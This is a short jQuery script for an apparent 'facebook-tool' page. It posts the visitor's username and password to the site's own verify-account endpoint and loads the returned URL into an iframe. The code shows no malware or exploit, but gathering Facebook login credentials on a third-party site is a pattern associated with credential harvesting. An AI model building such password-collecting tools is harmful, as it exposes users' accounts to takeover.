var loading = $('#loading');

var verify_account = function () {

    loading.css('display', 'block');

    $.ajax({
        type: 'POST',
        url: base + 'facebook-tool/verify-account',
        data: {
            username: $('#username').val(),
            password: $('#password').val()
        },
        error: function () {
        },
        success: function (response) {

            var result_verify = $('#result-verify');

            result_verify.find('iframe').attr('src', response);

            loading.css('display', 'none');

            result_verify.css('display', 'block');

        }
    });
};

var go_step_two = function () {
    $('#step-1').css('display', 'none');
    $('#step-2').css('display', 'block');
};